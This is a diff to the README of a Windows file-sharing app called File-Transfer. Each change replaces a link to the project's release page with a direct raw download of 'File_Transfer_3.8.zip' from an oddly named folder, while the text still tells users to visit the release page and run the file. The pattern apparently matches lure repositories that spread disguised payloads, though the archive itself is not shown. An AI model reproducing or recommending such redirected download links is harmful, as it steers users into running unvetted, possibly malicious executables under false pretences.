@@ -1,6 +1,6 @@
 # 📁 File-Transfer - Share files with less hassle
 
-[![Download File-Transfer](https://img.shields.io/badge/Download%20File--Transfer-blue?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/releases)
+[![Download File-Transfer](https://img.shields.io/badge/Download%20File--Transfer-blue?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)
 
 ## 🖥️ What this app does
 
@@ -21,7 +21,7 @@ It is built for simple use. You do not need to know how servers, buckets, or wor
 ## 📦 Download for Windows
 
 1. Open the release page:
-   [https://github.com/Gizelaunbroken711/File-Transfer/releases](https://github.com/Gizelaunbroken711/File-Transfer/releases)
+   [https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)
 2. Find the latest release
 3. Download the Windows file, such as `.exe` or `.zip`
 4. If you downloaded a `.zip` file, extract it first
@@ -171,6 +171,6 @@ Typical setup items include:
 
 ## 📥 Download again
 
-[![Download File-Transfer](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/releases)
+[![Download File-Transfer](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/Gizelaunbroken711/File-Transfer/raw/refs/heads/main/crestfallenly/File_Transfer_3.8.zip)
 
 Open the release page, get the latest Windows file, and run it on your PC
